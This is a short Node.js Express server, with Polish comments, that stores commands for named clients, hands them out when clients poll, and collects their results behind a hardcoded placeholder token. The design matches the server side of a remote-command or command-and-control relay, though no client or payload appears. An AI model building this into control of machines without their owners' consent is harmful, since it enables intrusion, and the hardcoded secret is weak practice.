import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

const API_TOKEN = 'secret-token-XYZ'; // zmień na swój sekret

const commands = {};
const results = {};

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Middleware autoryzacji
function authMiddleware(req, res, next) {
  const token = req.headers['authorization'];
  if (token !== `Bearer ${API_TOKEN}`) {
    return res.status(403).send('Forbidden');
  }
  next();
}

// Chronione endpointy
app.post('/command', authMiddleware, (req, res) => {
  const { command, client } = req.body;
  if (!command || !client) return res.status(400).send('Brakuje danych');
  commands[client] = command;
  res.sendStatus(200);
});

app.get('/command', authMiddleware, (req, res) => {
  const client = req.query.client;
  const cmd = commands[client];
  if (cmd) {
    delete commands[client];
    return res.send(cmd);
  }
  res.status(204).send();
});

app.post('/result', authMiddleware, (req, res) => {
  const { result, client } = req.body;
  if (!result || !client) return res.status(400).send('Brakuje danych');
  results[client] = result;
  res.sendStatus(200);
});

app.get('/result', authMiddleware, (req, res) => {
  const client = req.query.client;
  const r = results[client];
  if (r) {
    delete results[client];
    return res.send(r);
  }
  res.status(204).send();
});

app.listen(port, () => {
  console.log(`Serwer działa na porcie ${port}`);
});
